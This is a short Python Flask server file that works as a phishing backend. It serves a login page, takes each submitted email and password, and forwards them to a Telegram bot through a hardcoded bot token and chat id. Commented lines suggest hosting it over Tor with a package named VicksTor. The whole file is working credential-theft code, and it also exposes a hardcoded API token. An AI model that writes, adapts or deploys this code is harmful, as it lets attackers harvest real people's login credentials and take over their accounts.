
# pip install VicksTor --upgrade
# from HostTor import VicksTor

# import VicksTor
# VicksTor.run_server('flask')

from flask import (
    Flask, request,
    render_template, 
    send_from_directory
)

import requests
app = Flask(__name__, template_folder='./')

data = {
    "API" : "6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw",
    "id" : "5721393154"
}

@app.route('/', methods=['POST'])
def login():
    email = request.form['email']  # edit name
    password = request.form['password'] # edit name
    
    API = data['API']
    id = data['id']
    text = f'''
Username: {email}

Password: {password}
'''

    URL = f'https://api.telegram.org/bot{API}/sendMessage?chat_id={id}&text={text}'
    requests.get(url = URL)
    return render_template('index.html')

@app.route('/<path:filename>')  
def send_file(filename):
    return send_from_directory('./', filename)

@app.route('/')
def hello_world():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug = False)
